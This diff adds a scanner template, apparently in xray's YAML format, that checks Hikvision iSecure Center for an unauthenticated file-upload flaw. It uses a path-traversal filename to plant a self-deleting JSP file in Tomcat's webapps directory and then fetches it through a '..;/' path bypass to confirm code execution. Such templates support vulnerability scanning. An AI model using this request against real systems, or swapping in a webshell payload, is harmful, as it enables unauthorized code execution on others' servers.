@@ -1,0 +1,27 @@
+name: hikvision-iSecure-Cente-uploadAllPackage
+set:
+    randbody: randomLowercase(32)
+    randstr: randomLowercase(10)
+rules:
+  - method: POST
+    path: "/center_install/picUploadService/v1/uploadAllPackage/image"
+    headers:
+      Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+      Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+    body: "\
+      --------------------------553898708333958420021355\r\n\
+      Content-Disposition: form-data; name=\"sendfile\"; filename=\"../../../../components/tomcat85linux64.1/webapps/eportal/{{randstr}}.js\"\r\n\
+      Content-Type: application/octet-stream\r\n\
+      \r\n\
+      <% out.println({{randbody}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      --------------------------553898708333958420021355--
+      "
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/portal/ui/login/..;/..;/{{randstr}}.js"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes({{randbody}}))
+    
+detail:
+  author: fliggy
